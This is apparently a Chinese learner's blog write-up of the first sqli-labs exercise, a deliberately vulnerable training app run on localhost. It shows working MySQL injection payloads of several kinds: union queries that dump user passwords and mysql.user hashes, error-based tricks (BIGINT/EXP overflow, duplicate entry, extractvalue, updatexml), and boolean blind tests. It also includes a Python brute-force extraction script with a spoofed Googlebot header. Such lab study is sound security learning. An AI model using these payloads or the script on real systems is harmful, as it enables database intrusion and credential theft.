Title: sqli-labs/Less-1
Date: 2016-4-19
Category: SQL 
slug: sqli-labs-less-1

  网上关于这个的比较多，第一节课程是单引号注入，一般讲的都比较简单，加一个单引号闭合就行了，但是怎么注入数据呐。因为刚刚开始学，所以我翻了下源代码和数据库，注入出来的payload是这样的：
`2' union select group_concat(id,user()),group_concat(username,@@version),group_concat(password, (select hex(password) from mysql.user limit 1)) from users where id=3 order by id desc -- -`

简化一下语句是这样的select * from users where id=2 union select 1,2,3,mid((select password from mysql.user limit 1),N,1) order by id

union前后的字段数必须一样，union后面的数据可以自己发挥，如何让页面显示注入之后数据可以使用 order by，因为php语句是只显示sql里面第一行结果，所以要让我们注入出来的在第一行显示。 

## Error based 
 > 首先报错注入要注意闭合语句，比如`id=1`，如果在PHP里面是这样的`select * from users where id='$id'`，其中变量是被单引号包围，在使用报错注入的时候一定要闭合单引号,同理其他符号也是。

### BIGINT溢出错误
上面是union的注入情况，然后是报错注入如下：
`select * from users where id=1 and !(select*from(select user())x)+~0`
地址栏输入这样的语句
` 2' and !(select*from(select+user())x)%2b~0 `(注意单引号闭合，如果没有闭合还是出现正常的结果。

    本文的攻击之所以得逞，是因为mysql_error()会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。
source:<http://drops.wooyun.org/web/8024>

###EXP溢出错误
`http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20exp%28~%28select*from%28select%20user%28%29%29x%29%29%20--%20-`
和上面类似。
source:<http://drops.wooyun.org/tips/8166>

另外有group by和count冲突，updatexml报错等

###Duplicate entry …..’ for key ‘group_key’

错误比较经典，地址栏的输入poyload如下：
`and (select 29 from(select count(*),concat(floor(rand(0)*2),user())x from users group by x)a)`
技巧的话就是把`floor(rand(0)*2)`使用concat把想要爆出的数据连接在一起为某个伪字段，然后`group by`。
报错需要count(*)，rand()、group by，三者缺一不可.具体的原因嘛看下面三个：

* <http://rickgray.me/2014/11/16/error-based-sql-injection.html>
* <http://www.lijiejie.com/mysql-injection-error-based-duplicate-entry/>
* <http://drops.wooyun.org/tips/14312>

###extractivalue
payload: `AND (extractvalue(1,concat(0x7e,(select user()))))`

###updatexml
payload: `and (updatexml (1,concat(0x7e,(select user()),0x73),1))`

###GeometryCollection
payload: `and GeometryCollection((select * from(select * from(select user())a)b))`

其他几个好像不经常见，看原网页的记录吧：
<http://c-chicken.cc/hacking/2016/01/03/Mysql-Error-Sqlinjection.html>

## Bool blind
布尔盲注

`http://127.0.0.1:8080/sqli-labs/Less-1/?id=2%27%20and%20mid%28%28select%20@@version%29,1,1%29=6%20%20--%20-`
手工参考：<http://www.wooyun.org/bugs/wooyun-2010-017425>
判断长度:`And (select length(user()))=12`
判断字符:`And (select ASCII(SUBSTR(user(),7,1)))>99`
这种可以写个脚本：

```python
#!/usr/bin/env python
# coding:utf-8

import time
import string
import sys
import random
import requests

headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'}

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())
user = ''

for i in range(1, 16):
    for payload in payloads:
        s = 'ascii(mid(database(),%s,1))=%s' % (i, ord(payload))
        r = requests.get('http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20' + s, headers=headers)
        if len(r.content) == 49639:
            user += payload
            print '\n[Scan in progress]' + user
            time.sleep(5)
            break
        else:
            print '.',
            print 'http://127.0.0.1:8080/sqli-labs/Less-1/?id=2 and%20' + s + '\n'
            print len(r.content)
            time.sleep(5)
print '\n[Done]MySQL user is ' + user
```
判断那里可以写返回的文本长度或者`r.content.find('something')>0`

根据sqlmap跑出来的payload，还有一种时间盲注可以查询数据，这种暂时还不会。
这是sqli-labs的第一节课，网上找到两个布尔盲注的，password没跑下来，不晓得什么个结果。
















